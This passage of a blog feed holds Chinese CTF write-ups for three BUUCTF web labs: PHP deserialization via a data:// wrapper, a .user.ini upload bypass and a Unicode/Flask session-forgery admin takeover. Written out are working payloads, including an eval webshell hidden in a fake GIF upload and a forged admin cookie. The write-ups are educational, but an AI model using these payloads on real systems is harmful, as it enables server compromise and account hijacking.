class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure><p>于是构造出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;8b5645ba-c840-468a-b33c-c48d8810e9b3.node3.buuoj.cn&#x2F;?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&#x3D;&amp;file&#x3D;useless.php&amp;password&#x3D;O:4:%22Flag%22:1:&#123;s:4:%22file%22;s:8:%22flag.php%22;&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/02/28/ZJCTF-2019-NiZhuanSiWei/image-20210303220817689.png" class="lazyload" data-srcset="/2021/02/28/ZJCTF-2019-NiZhuanSiWei/image-20210303220817689.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210303220817689"></p>]]></content>
      
      
      <categories>
          
          <category> ctf-Write up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> bypass </tag>
            
            <tag> php伪协议 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[suctf2019]CheckIn</title>
      <link href="2021/02/27/2019-CheckIn/"/>
      <url>2021/02/27/2019-CheckIn/</url>
      
        <content type="html"><![CDATA[<p>利用上传<code>.user.ini</code> 自动文件包含从而绕过一些文件上传利用限制</p><span id="more"></span><h3 id="0x01-前置知识"><a href="#0x01-前置知识" class="headerlink" title="0x01 前置知识"></a>0x01 前置知识</h3><p><code>.user.ini</code>，它比<code>.htaccess</code>用的更广，不管是nginx/apache/IIS，只要是以fastcgi运行的php都可以用这个方法。</p><h4 id="什么是-user-ini"><a href="#什么是-user-ini" class="headerlink" title="什么是 .user.ini?"></a>什么是 .user.ini?</h4><p>我们知道php.ini是php默认的配置文件，其中包括了很多php的配置，<a href="https://www.php.net/manual/zh/ini.list.php">https://www.php.net/manual/zh/ini.list.php</a></p><p>配置模式定义分为了： PHP_INI_SYSTEM、PHP_MINI_PERDIR、PHP_INI_ALL、PHP_INI_USER</p><p><img src="/2021/02/27/2019-CheckIn/image-20210303205358415.png" class="lazyload" data-srcset="/2021/02/27/2019-CheckIn/image-20210303205358415.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210303205358415"></p><p>关于.user.ini文件官方解释为：</p><blockquote><p>除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（[$_SERVER<a href="https://www.php.net/manual/zh/reserved.variables.server.php">‘DOCUMENT_ROOT’]</a> 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。</p><p>在 .user.ini 风格的 INI 文件中只有具有 <strong><code>PHP_INI_PERDIR</code></strong> 和 <strong><code>PHP_INI_USER</code></strong> 模式的 INI 设置可被识别。</p></blockquote><p><strong>也就是说.user.ini 相当于用户自定义的一个php.ini,但是只能修改可修改范围为 PHP_INI_PERDIR、PHP_INI_USER的配置</strong></p><p>于是我们通过修改一些配置选项，借助.user.ini构造一个后门，我们关注一下php.ini 文档中的<code>auto_append_file、auto_prepend_file</code></p><p><img src="/2021/02/27/2019-CheckIn/image-20210303210401201.png" class="lazyload" data-srcset="/2021/02/27/2019-CheckIn/image-20210303210401201.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210303210401201"></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file string</span><br><span class="line">Specifies the name of a file that is automatically parsed before the main file. The file is included as if it was called with the require function, so include_path is used.</span><br><span class="line"></span><br><span class="line">The special value none disables auto-prepending.</span><br><span class="line"></span><br><span class="line">auto_append_file string</span><br><span class="line">Specifies the name of a file that is automatically parsed after the main file. The file is included as if it was called with the require function, so include_path is used.</span><br><span class="line"></span><br><span class="line">The special value none disables auto-appending.</span><br></pre></td></tr></table></figure><p>官方文档解释如上，auto_prepend_file 用于在脚本解析开始处包含文件，auto_append_file 用于在脚本解析最后后包含文件，且如果脚本中含有exit(),则不发生，于是我们可以调此配置包含本不会被解析的图片马</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file&#x3D;x.png</span><br></pre></td></tr></table></figure><h3 id="0x02-wp"><a href="#0x02-wp" class="headerlink" title="0x02 wp"></a>0x02 wp</h3><p><img src="/2021/02/27/2019-CheckIn/image-20210303211138367.png" class="lazyload" data-srcset="/2021/02/27/2019-CheckIn/image-20210303211138367.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210303211138367"></p><p>最典型不过的文件包含</p><p>上传.user.ini 后上传webshell即可</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/index.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>ad475845-4d19-4b6a-add8-d32bfdf8171d.node3.buuoj.cn</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>352</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://ad475845-4d19-4b6a-add8-d32bfdf8171d.node3.buuoj.cn</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryo5STsLcEm8W4O0oi</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://ad475845-4d19-4b6a-add8-d32bfdf8171d.node3.buuoj.cn/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>UM_distinctid=177f24714762d6-07ad73289ec17-53e356a-144000-177f24714776fd</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryo5STsLcEm8W4O0oi</span><br><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>form-data; name=&quot;fileUpload&quot;; filename=&quot;x.png&quot;</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>image/png</span><br><span class="line"></span><br><span class="line">GIF89a</span><br><span class="line">&lt;script language=&#x27;php&#x27;&gt;@eval($_GET[M0th]);phpinfo();&lt;/script&gt;</span><br><span class="line">------WebKitFormBoundaryo5STsLcEm8W4O0oi</span><br><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>form-data; name=&quot;upload&quot;</span><br><span class="line"></span><br><span class="line">鎻愪氦</span><br><span class="line">------WebKitFormBoundaryo5STsLcEm8W4O0oi--</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf-Write up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件上传 </tag>
            
            <tag> bypass </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[HCTF 2018]admin</title>
      <link href="2021/02/24/HCTF-2018-admin/"/>
      <url>2021/02/24/HCTF-2018-admin/</url>
      
        <content type="html"><![CDATA[<h3 id="0x01简单分析题目"><a href="#0x01简单分析题目" class="headerlink" title="0x01简单分析题目"></a>0x01简单分析题目</h3><p>一个登入框，一个注册框</p><p>注册一个test账户进行测试</p><p><img src="/2021/02/24/HCTF-2018-admin/image-20210302173658163.png" class="lazyload" data-srcset="/2021/02/24/HCTF-2018-admin/image-20210302173658163.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210302173658163"></p><p>查看源代码发现</p><p><img src="/2021/02/24/HCTF-2018-admin/image-20210302173738764.png" class="lazyload" data-srcset="/2021/02/24/HCTF-2018-admin/image-20210302173738764.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210302173738764"></p><p>于是猜测越权漏洞，即登入admin账户，而且登入后多了一些功能</p><p><img src="/2021/02/24/HCTF-2018-admin/image-20210302174236807.png" class="lazyload" data-srcset="/2021/02/24/HCTF-2018-admin/image-20210302174236807.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210302174236807"></p><p>在更改密码处 发现了源码地址</p><p><img src="/2021/02/24/HCTF-2018-admin/image-20210302174337771.png" class="lazyload" data-srcset="/2021/02/24/HCTF-2018-admin/image-20210302174337771.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210302174337771"></p><p>于是我们得到了源代码，发现其基于python flask 开发</p><h3 id="0x02-源码分析"><a href="#0x02-源码分析" class="headerlink" title="0x02 源码分析"></a>0x02 源码分析</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, url_for, flash, request, redirect, session, make_response</span><br><span class="line"><span class="keyword">from</span> flask_login <span class="keyword">import</span> logout_user, LoginManager, current_user, login_user</span><br><span class="line"><span class="keyword">from</span> app <span class="keyword">import</span> app, db</span><br><span class="line"><span class="keyword">from</span> config <span class="keyword">import</span> Config</span><br><span class="line"><span class="keyword">from</span> app.models <span class="keyword">import</span> User</span><br><span class="line"><span class="keyword">from</span> forms <span class="keyword">import</span> RegisterForm, LoginForm, NewpasswordForm</span><br><span class="line"><span class="keyword">from</span> twisted.words.protocols.jabber.xmpp_stringprep <span class="keyword">import</span> nodeprep</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="keyword">from</span> code <span class="keyword">import</span> get_verify_code</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/code&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_code</span>():</span></span><br><span class="line">    image, code = get_verify_code()</span><br><span class="line">    <span class="comment"># 图片以二进制形式写入</span></span><br><span class="line">    buf = BytesIO()</span><br><span class="line">    image.save(buf, <span class="string">&#x27;jpeg&#x27;</span>)</span><br><span class="line">    buf_str = buf.getvalue()</span><br><span class="line">    <span class="comment"># 把buf_str作为response返回前端，并设置首部字段</span></span><br><span class="line">    response = make_response(buf_str)</span><br><span class="line">    response.headers[<span class="string">&#x27;Content-Type&#x27;</span>] = <span class="string">&#x27;image/gif&#x27;</span></span><br><span class="line">    <span class="comment"># 将验证码字符串储存在session中</span></span><br><span class="line">    session[<span class="string">&#x27;image&#x27;</span>] = code</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/index&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, title = <span class="string">&#x27;hctf&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>, methods = [<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span>():</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> current_user.is_authenticated:  <span class="comment">#当前用户存在，重定向到index</span></span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    form = RegisterForm()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        name = strlower(form.username.data) <span class="comment">#将username通过strlower函数小写转换至name</span></span><br><span class="line">        <span class="keyword">if</span> session.get(<span class="string">&#x27;image&#x27;</span>).lower() != form.verify_code.data.lower(): <span class="comment">#从session中取出验证码进行校验</span></span><br><span class="line">            flash(<span class="string">&#x27;Wrong verify code.&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>, title = <span class="string">&#x27;register&#x27;</span>, form=form)</span><br><span class="line">        <span class="keyword">if</span> User.query.filter_by(username = name).first():</span><br><span class="line">            flash(<span class="string">&#x27;The username has been registered&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;register&#x27;</span>))</span><br><span class="line">        user = User(username=name)</span><br><span class="line">        user.set_password(form.password.data)</span><br><span class="line">        db.session.add(user)</span><br><span class="line">        db.session.commit()</span><br><span class="line">        flash(<span class="string">&#x27;register successful&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>, title = <span class="string">&#x27;register&#x27;</span>, form = form)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods = [<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>():</span></span><br><span class="line">    <span class="keyword">if</span> current_user.is_authenticated: <span class="comment">#当前用户登入，重定向到index</span></span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    form = LoginForm()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        name = strlower(form.username.data) <span class="comment">#strlower函数进行转换</span></span><br><span class="line">        session[<span class="string">&#x27;name&#x27;</span>] = name</span><br><span class="line">        user = User.query.filter_by(username=name).first()</span><br><span class="line">        <span class="keyword">if</span> user <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> <span class="keyword">not</span> user.check_password(form.password.data): <span class="comment">#如果用户不存在或者密码不正确</span></span><br><span class="line">            flash(<span class="string">&#x27;Invalid username or password&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">        login_user(user, remember=form.remember_me.data) <span class="comment">#登入用户</span></span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>)) <span class="comment">#重定向至index</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>, title = <span class="string">&#x27;login&#x27;</span>, form = form)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/logout&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span>():</span></span><br><span class="line">    logout_user()</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&#x27;/index&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/change&#x27;</span>, methods = [<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> current_user.is_authenticated: <span class="comment">#当前用户未登入，定向至login</span></span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">    form = NewpasswordForm()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        name = strlower(session[<span class="string">&#x27;name&#x27;</span>]) <span class="comment">#经过了strlower函数进行了大小写转换</span></span><br><span class="line">        user = User.query.filter_by(username=name).first()</span><br><span class="line">        user.set_password(form.newpassword.data)</span><br><span class="line">        db.session.commit()</span><br><span class="line">        flash(<span class="string">&#x27;change successful&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;change.html&#x27;</span>, title = <span class="string">&#x27;change&#x27;</span>, form = form)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/edit&#x27;</span>, methods = [<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>():</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        </span><br><span class="line">        flash(<span class="string">&#x27;post successful&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;edit.html&#x27;</span>, title = <span class="string">&#x27;edit&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(<span class="params"><span class="number">404</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">page_not_found</span>(<span class="params">error</span>):</span></span><br><span class="line">    title = unicode(error)</span><br><span class="line">    message = error.description</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;errors.html&#x27;</span>, title=title, message=message)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">strlower</span>(<span class="params">username</span>):</span></span><br><span class="line">    username = nodeprep.prepare(username) <span class="comment">#这个strlower转换函数写的很有意思</span></span><br><span class="line">    <span class="keyword">return</span> username</span><br></pre></td></tr></table></figure><h3 id="0x03-解法1-unicode欺骗"><a href="#0x03-解法1-unicode欺骗" class="headerlink" title="0x03 解法1 unicode欺骗"></a>0x03 解法1 unicode欺骗</h3><p>经过百度谷歌搜索发现nodeprep.prepare存在unicode漏洞，对于以下字母</p><p><img src="/2021/02/24/HCTF-2018-admin/image-20210302182135700.png" class="lazyload" data-srcset="/2021/02/24/HCTF-2018-admin/image-20210302182135700.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210302182135700"></p><p>会得到的结果是ABCDEFGHIJKLMNOP等大写字母</p><p>nodeprep.prepare会进行<code>ᴀ -&gt; A -&gt; a</code></p><p>于是构造攻击链:</p><blockquote><p>注册用户ᴀdmin 相当于注册Admin</p><p>登入Admin后修改密码相当于修改了admin的密码</p><p>因为 无论是注册 登录 还是修改密码都会调用一次strlower()函数</p></blockquote><h3 id="0x04-解法2-session伪造"><a href="#0x04-解法2-session伪造" class="headerlink" title="0x04 解法2 session伪造"></a>0x04 解法2 session伪造</h3><p>根据P神的文章:<a href="https://www.leavesongs.com/PENETRATION/client-session-security.html">https://www.leavesongs.com/PENETRATION/client-session-security.html</a></p><p>我们知道python_flask 将 session保存在cookie中</p><p>我们根据<a href="https://github.com/noraj/flask-session-cookie-manager">https://github.com/noraj/flask-session-cookie-manager</a></p><p>解一下测试账户的cookie</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#39;_fresh&#39;: True, &#39;_id&#39;: b&#39;e3fcc1fd987f5faab9d0ee5fda855893be4d89bc8e4f787d17271a2c2c28889d6aac7de47f9b19399bf08298d047e471a0ef98d020a33e729ad36e137b1dec7c&#39;, &#39;csrf_token&#39;: b&#39;55784b1b7c52107000f67dfea5625d19d506d793&#39;, &#39;name&#39;: &#39;test&#39;, &#39;user_id&#39;: &#39;10&#39;&#125;</span><br></pre></td></tr></table></figure><p>我们在知道secret_key的情况下可以伪造admin，secret_key在config.py中</p><p><img src="/2021/02/24/HCTF-2018-admin/image-20210302185847364.png" class="lazyload" data-srcset="/2021/02/24/HCTF-2018-admin/image-20210302185847364.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210302185847364"></p><p>于是我们构造</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#123;&quot;_fresh&quot;:true,&quot;_id&quot;:&#123;&quot; b&quot;:&quot;ZTNmY2MxZmQ5ODdmNWZhYWI5ZDBlZTVmZGE4NTU4OTNiZTRkODliYzhlNGY3ODdkMTcyNzFhMmMyYzI4ODg5ZDZhYWM3ZGU0N2Y5YjE5Mzk5YmYwODI5OGQwNDdlNDcxYTBlZjk4ZDAyMGEzM2U3MjlhZDM2ZTEzN2IxZGVjN2M&#x3D;&quot;&#125;,&quot;csrf_token&quot;:&#123;&quot; b&quot;:&quot;NTU3ODRiMWI3YzUyMTA3MDAwZjY3ZGZlYTU2MjVkMTlkNTA2ZDc5Mw&#x3D;&#x3D;&quot;&#125;,&quot;name&quot;:&quot;admin&quot;,&quot;user_id&quot;:&quot;10&quot;&#125;&#39;</span><br></pre></td></tr></table></figure><p>伪造成功</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 